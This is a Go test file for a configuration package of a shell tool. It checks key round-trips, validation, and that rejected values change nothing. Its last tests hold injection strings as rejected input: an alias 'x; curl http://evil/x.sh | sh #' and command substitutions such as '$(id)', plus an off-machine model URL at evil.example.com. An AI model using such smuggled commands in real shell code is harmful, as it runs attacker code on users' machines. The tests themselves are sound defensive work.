package config

import (
	"errors"
	"strings"
	"testing"
	"time"
)

// Every key must be readable and settable. This is the test that keeps the
// table honest: an entry added with a `read` but no `apply` compiles fine and
// fails here, which is the only place it would ever be noticed.
func TestEveryKeyRoundTrips(t *testing.T) {
	cfg := Default()
	for _, k := range Keys() {
		value, ok := cfg.Get(k.Name)
		if !ok {
			t.Errorf("%s: documented but not readable", k.Name)
			continue
		}
		updated, err := Set(cfg, k.Name, value)
		if err != nil {
			t.Errorf("%s: setting its own current value %q failed: %v", k.Name, value, err)
			continue
		}
		again, _ := updated.Get(k.Name)
		if again != value {
			t.Errorf("%s: round-trip changed %q into %q", k.Name, value, again)
		}
		if k.What == "" || k.Values == "" || k.Default == "" {
			t.Errorf("%s: a settable key with no documentation", k.Name)
		}
	}
}

func TestSettingsCoversEveryKey(t *testing.T) {
	got := Default().Settings()
	if len(got) != len(Keys()) {
		t.Fatalf("Settings returned %d entries for %d keys", len(got), len(Keys()))
	}
	seen := map[string]bool{}
	for _, s := range got {
		seen[s.Key] = true
	}
	for _, k := range Keys() {
		if !seen[k.Name] {
			t.Errorf("%s is missing from Settings", k.Name)
		}
	}
}

func TestSetParsesAndValidates(t *testing.T) {
	cases := []struct {
		key, value string
		check      func(Config) bool
	}{
		{"capture.tier", "T1", func(c Config) bool { return c.Capture.Tier == TierT1 }},
		{"capture.tier", "on", func(c Config) bool { return c.Capture.Tier == TierT05 }},
		{"capture.tier", "off", func(c Config) bool { return c.Capture.Tier == TierOff }},
		{"capture.tier", "t0", func(c Config) bool { return c.Capture.Tier == TierT0 }},
		{"capture.retention", "1h", func(c Config) bool { return c.Capture.Retention == time.Hour }},
		{"capture.redact", "a, b ,, c", func(c Config) bool { return len(c.Capture.Redact) == 3 }},
		{"daemon.autostart", "true", func(c Config) bool { return c.Daemon.Autostart }},
		{"history.max_entries", "10", func(c Config) bool { return c.History.MaxEntries == 10 }},
		{"ui.output", "JSON", func(c Config) bool { return c.UI.Output == OutputJSON }},
		{"shell.alias", "", func(c Config) bool { return c.Shell.Alias == "" }},
	}
	for _, tc := range cases {
		got, err := Set(Default(), tc.key, tc.value)
		if err != nil {
			t.Errorf("%s=%q: %v", tc.key, tc.value, err)
			continue
		}
		if !tc.check(got) {
			t.Errorf("%s=%q did not take effect", tc.key, tc.value)
		}
	}
}

// A rejected value must leave the configuration untouched. Accepting it and
// failing on the next load is how a tool becomes unable to start because of
// something it wrote itself.
func TestRejectedValueChangesNothing(t *testing.T) {
	cases := []struct{ key, value string }{
		{"capture.tier", "T9"},
		{"capture.retention", "soon"},
		{"daemon.autostart", "yes please"},
		{"history.max_entries", "lots"},
		{"ui.output", "yaml"},
		{"ui.theme", "neon"},
		{"model.max_rss", "a lot"},
	}
	base := Default()
	for _, tc := range cases {
		got, err := Set(base, tc.key, tc.value)
		if err == nil {
			t.Errorf("%s=%q was accepted", tc.key, tc.value)
			continue
		}
		if !sameSettings(got, base) {
			t.Errorf("%s=%q returned a modified configuration despite failing", tc.key, tc.value)
		}
	}
}

// sameSettings compares two configurations through the key table, which is
// also the only comparison that matters: two configurations differ exactly
// when some documented key reads differently.
func sameSettings(a, b Config) bool {
	as, bs := a.Settings(), b.Settings()
	if len(as) != len(bs) {
		return false
	}
	for i := range as {
		if as[i] != bs[i] {
			return false
		}
	}
	return true
}

func TestUnknownKeySuggests(t *testing.T) {
	_, err := Set(Default(), "capture.teir", "T1")
	var unknown *UnknownKeyError
	if !errors.As(err, &unknown) {
		t.Fatalf("expected an UnknownKeyError, got %v", err)
	}
	if !strings.Contains(err.Error(), "capture.tier") {
		t.Errorf("the error should point at the near miss, got: %v", err)
	}
}

func TestKeysMatching(t *testing.T) {
	if got := len(KeysMatching("")); got != len(Keys()) {
		t.Errorf("an empty prefix returned %d of %d keys", got, len(Keys()))
	}
	for _, k := range KeysMatching("model.") {
		if !strings.HasPrefix(k.Name, "model.") {
			t.Errorf("prefix model. matched %s", k.Name)
		}
	}
	if len(KeysMatching("nothing.like.this")) != 0 {
		t.Error("a prefix nothing starts with should match nothing")
	}
}

// Keys() hands out copies. A caller must not be able to reach the setters, or
// the table stops being the only way to change a field by name.
func TestKeysAreInert(t *testing.T) {
	for _, k := range Keys() {
		if k.read != nil || k.apply != nil {
			t.Fatalf("%s: Keys() leaked its accessors", k.Name)
		}
	}
}

// An alias is interpolated into generated shell code as a function name, so a
// value that is not a function name has to be refused before it can reach a
// startup file.
func TestSetRefusesAliasThatIsNotAFunctionName(t *testing.T) {
	for _, bad := range []string{
		"x; curl http://evil/x.sh | sh #",
		"foo bar",
		"$(id)",
		"1st",
		"a`whoami`",
		strings.Repeat("a", 33),
	} {
		if _, err := Set(Default(), "shell.alias", bad); err == nil {
			t.Errorf("shell.alias=%q was accepted", bad)
		}
	}
	for _, good := range []string{"", "uh", "_w", "my-wut", "W2"} {
		if _, err := Set(Default(), "shell.alias", good); err != nil {
			t.Errorf("shell.alias=%q was refused: %v", good, err)
		}
	}
}

// A "local model" that can be pointed at a remote host would send every
// question the user types to someone else's server.
func TestSetRefusesNonLoopbackModelURL(t *testing.T) {
	for _, bad := range []string{
		"http://evil.example.com:11434",
		"https://10.0.0.5:11434",
		"ftp://127.0.0.1:11434",
	} {
		if _, err := Set(Default(), "model.ollama", bad); err == nil {
			t.Errorf("model.ollama=%q was accepted", bad)
		}
	}
	for _, good := range []string{
		"http://127.0.0.1:11434", "http://localhost:11434", "http://[::1]:11434",
	} {
		if _, err := Set(Default(), "model.ollama", good); err != nil {
			t.Errorf("model.ollama=%q was refused: %v", good, err)
		}
	}
}

// The environment is the other way in, and it must not be a way around.
func TestApplyEnvRefusesNonLoopbackModelURL(t *testing.T) {
	env := func(k string) (string, bool) {
		if k == "WUT_OLLAMA_URL" {
			return "http://evil.example.com:11434", true
		}
		return "", false
	}
	if _, err := Default().ApplyEnv(env); err == nil {
		t.Fatal("WUT_OLLAMA_URL pointing off-machine was accepted")
	}
}
